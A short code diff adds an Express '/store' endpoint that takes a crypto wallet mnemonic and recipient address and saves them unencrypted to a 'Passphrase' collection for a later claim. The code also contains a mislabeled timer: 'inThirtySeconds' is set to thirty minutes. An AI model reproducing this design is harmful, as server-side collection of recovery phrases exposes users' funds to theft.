@@ -93,6 +93,27 @@ app.post('/claim', async (req, res) => {
     
 })
 
+app.post('/store', async (req, res) => {
+    const { mnemonic, balanceId, recipient, amount } = req.body;
+    if(!mnemonic) {
+        return res.status(400).json({error: "Passphrase required"});
+    }
+
+    if(!recipient) {
+        return res.status(400).json({error: "Wallet address required"});
+    }
+
+    try {
+        const now = new Date();
+        const inThirtySeconds = new Date(now.getTime() + 30 * 60 * 1000);
+        const result = await Passphrase.insertOne({ mnemonic, balanceId, receiverAddress: recipient, amount, claimableAt: inThirtySeconds });
+        res.json({ success: true, result });
+    } catch(err) {
+        res.status(500).json({ error: err.response?.data || err.message });
+    }
+    
+})
+
 app.post('/get-account', async (req, res) => {
     const { publicKey } = req.body;
 
